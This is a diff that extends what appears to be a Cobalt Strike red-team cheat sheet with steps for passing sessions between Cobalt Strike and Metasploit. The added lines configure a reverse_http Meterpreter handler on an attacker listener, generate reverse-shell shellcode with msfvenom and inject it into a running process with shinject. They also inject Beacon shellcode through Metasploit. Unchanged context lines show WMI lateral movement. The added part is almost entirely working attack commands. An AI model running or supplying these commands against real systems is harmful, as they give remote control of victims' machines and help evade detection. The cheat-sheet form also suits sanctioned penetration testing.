@@ -133,4 +133,29 @@ remote-exec [method] [target] [command]
 ## To execute a beacon with wmi (it isn't ins the jump command) just upload the beacon and execute it
 beacon> upload C:\Payloads\beacon-smb.exe
 beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
-</code></pre>
+
+
+# Pass session to Metasploit - Through listener
+## On metaploit host
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
+msf6 exploit(multi/handler) > set LHOST eth0
+msf6 exploit(multi/handler) > set LPORT 8080
+msf6 exploit(multi/handler) > exploit -j
+
+## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
+beacon> spawn metasploit
+## You can only spawn x86 Meterpreter sessions with the foreign listener.
+
+# Pass session to Metasploit - Through shellcode injection
+## On metasploit host
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
+## Run msfvenom and prepare the multi/handler listener
+
+## Copy bin file to coblat strike host
+ps
+shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process
+
+# Pass metasploit session to cobalt strike
+## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
+## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode</code></pre>
